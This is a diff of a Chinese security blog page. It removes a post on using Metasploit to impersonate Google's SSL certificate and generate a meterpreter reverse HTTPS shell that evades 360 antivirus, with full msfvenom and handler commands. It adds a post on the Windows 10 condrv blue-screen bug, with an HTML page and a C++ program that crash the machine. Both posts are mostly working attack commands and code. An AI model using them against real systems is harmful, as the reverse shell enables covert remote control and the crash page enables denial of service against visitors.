@@ -5,22 +5,19 @@
   
 
   
-  <title>httpsms | 魔域魂窟</title>
+  <title>win10 | 魔域魂窟</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="#https证书绕过杀软msf生成证书（要能连上google，用俺vps来搞）use auxiliary&#x2F;gather&#x2F;impersonate_ssl set RHOST www.google.com run生成msf攻击载荷：msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_winhttps LHOST&#x3D;192.168.226.136 LPORT&#x3D;443 Paylo">
+  <meta name="description" content="#win10蓝屏bug最近win10 的蓝屏bug最近很火，在google浏览器中输入：  \\.\globalroot\device\condrv\kernelconnect  ![enter image description here](https:&#x2F;&#x2F;secquan.zzyuncheng.com&#x2F;e028b8d1549111d870b8c570c002ca18.png-quanzi)htt">
 <meta property="og:type" content="article">
-<meta property="og:title" content="httpsms">
-<meta property="og:url" content="http://example.com/2020/11/17/httpsms/index.html">
+<meta property="og:title" content="win10">
+<meta property="og:url" content="http://example.com/2021/01/30/win10/index.html">
 <meta property="og:site_name" content="魔域魂窟">
-<meta property="og:description" content="#https证书绕过杀软msf生成证书（要能连上google，用俺vps来搞）use auxiliary&#x2F;gather&#x2F;impersonate_ssl set RHOST www.google.com run生成msf攻击载荷：msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_winhttps LHOST&#x3D;192.168.226.136 LPORT&#x3D;443 Paylo">
+<meta property="og:description" content="#win10蓝屏bug最近win10 的蓝屏bug最近很火，在google浏览器中输入：  \\.\globalroot\device\condrv\kernelconnect  ![enter image description here](https:&#x2F;&#x2F;secquan.zzyuncheng.com&#x2F;e028b8d1549111d870b8c570c002ca18.png-quanzi)htt">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://s1.ax1x.com/2017/10/17/JOAmV.png">
-<meta property="og:image" content="https://s1.ax1x.com/2017/10/17/JOEwT.png">
-<meta property="article:published_time" content="2020-11-17T10:00:38.000Z">
-<meta property="article:modified_time" content="2020-11-17T10:00:49.186Z">
+<meta property="article:published_time" content="2021-01-30T08:14:21.000Z">
+<meta property="article:modified_time" content="2021-01-30T08:22:37.507Z">
 <meta property="article:author" content="魂笛">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://s1.ax1x.com/2017/10/17/JOAmV.png">
   
     <link rel="alternate" href="/atom.xml" title="魔域魂窟" type="application/atom+xml">
   
@@ -69,10 +66,10 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main"><article id="post-httpsms" class="article article-type-post" itemscope itemprop="blogPost">
+        <section id="main"><article id="post-win10" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2020/11/17/httpsms/" class="article-date">
-  <time datetime="2020-11-17T10:00:38.000Z" itemprop="datePublished">2020-11-17</time>
+    <a href="/2021/01/30/win10/" class="article-date">
+  <time datetime="2021-01-30T08:14:21.000Z" itemprop="datePublished">2021-01-30</time>
 </a>
     
   </div>
@@ -83,7 +80,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      httpsms
+      win10
     </h1>
   
 
@@ -91,25 +88,37 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>#https证书绕过杀软<br><strong>msf生成证书（要能连上google，用俺vps来搞）</strong><br>use auxiliary/gather/impersonate_ssl</p>
-<p>set RHOST <a target="_blank" rel="noopener" href="http://www.google.com/">www.google.com</a></p>
-<p>run<br><img src="https://s1.ax1x.com/2017/10/17/JOAmV.png" alt="enter image description here"><br>生成msf攻击载荷：msfvenom -p windows/meterpreter/reverse_winhttps LHOST=192.168.226.136 LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=/root/<a target="_blank" rel="noopener" href="http://www.google.com.pem/">www.google.com.pem</a> StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH -f py -o pentestlab.py<br>然后msf监听：</p>
-<p>use exploit/multi/handler</p>
-<p>set payload windows/meterpreter/reverse_winhttps</p>
-<p>set LHOST 192.168.226.136</p>
-<p>set LPORT 443</p>
-<p>set HandlerSSLCert /root/<a target="_blank" rel="noopener" href="http://www.google.com.pem/">www.google.com.pem</a> (设置证书)</p>
-<p>set StagerVerifySSLCert true</p>
-<p>exploit -j</p>
-<p>然后在win7上运行这个pentestlab.py<br><img src="https://s1.ax1x.com/2017/10/17/JOEwT.png" alt="enter image description here"></p>
-<p>360杀毒，安全卫士无反应。</p>
-<p>全自动工具：<a target="_blank" rel="noopener" href="https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL">https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL</a></p>
-<p>参考：<a target="_blank" rel="noopener" href="https://pentestlab.blog/category/defense-evasion/">https://pentestlab.blog/category/defense-evasion/</a></p>
+        <p>#win10蓝屏bug<br>最近win10 的蓝屏bug最近很火，在google浏览器中输入：</p>
+<pre> \\.\globalroot\device\condrv\kernelconnect<pre>
+
+![enter image description here](https://secquan.zzyuncheng.com/e028b8d1549111d870b8c570c002ca18.png-quanzi)https://secquan.zzyuncheng.com/e028b8d1549111d870b8c570c002ca18.png-quanzi
+
+就会蓝屏，亲测有效；
+
+<pre>看到吾爱中分析解释说是condrv驱动里的派遣函数CdpDispatchCleanup发生了空指针引用，而后触发了蓝屏。
+因为谷歌浏览器调用了GetFileAttributesExW函数，然后转入ntdll,接着走进了内核，然后调用了condrv的派遣函数。<pre>
+
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;html&gt;<br>&lt;head&gt;<br>&lt;&#x2F;head&gt;<br>&lt;body&gt;&gt;<br>&lt;script&gt;document.location &#x3D; &#39;\\\\.\\globalroot\\device\\condrv\\kernelconnect&#39;;&lt;&#x2F;script&gt;<br>&lt;&#x2F;body&gt;<br>&lt;&#x2F;html&gt;<br><br></code></pre></td></tr></table></figure>
+有师傅分享了代码：
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#x2F; BSOD.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。<br>&#x2F;&#x2F;<br>#include &lt;iostream&gt;<br>#include &lt;Windows.h&gt;<br>int main()<br>&#123;<br>    WCHAR fileName[] &#x3D; L&quot;\\\\.\\globalroot\\device\\condrv\\kernelconnect&quot;;<br>    WIN32_FILE_ATTRIBUTE_DATA data;<br>    GetFileAttributesEx(fileName, GetFileExInfoStandard, &amp;data);<br>&#125;<br></code></pre></td></tr></table></figure>
+直接编译成exe文件：
+
+![enter image description here](https://secquan.zzyuncheng.com/aca24da60da6bec2e6a1c31834ddf81e.png-quanzi)
+
+运行生成的exe文件，成功蓝屏：
+![enter image description here](https://secquan.zzyuncheng.com/9f91f10add04ef39b149d1d65fc32521.png-quanzi)
+好像没看到可以利用此漏洞来远程执行代码的，希望win10早点修复这个bug呗。
+
+参考链接：https://www.52pojie.cn/thread-1354077-1-1.html
+
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/17/httpsms/" data-id="ckkjg6yq50003bfcp27a3gy8z" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/01/30/win10/" data-id="ckkjg6yrc0004bfcpedxj0xkj" class="article-share-link">Share</a>
       
       
     </footer>
@@ -118,19 +127,10 @@
     
 <nav id="article-nav">
   
-    <a href="/2020/11/17/CVE-2020-1380%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          CVE-2020-1380签名伪造
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/11/17/cms/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2020/11/17/CVE-2020-1380%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">cms</div>
+      <div class="article-nav-title">CVE-2020-1380签名伪造</div>
     </a>
   
 </nav>
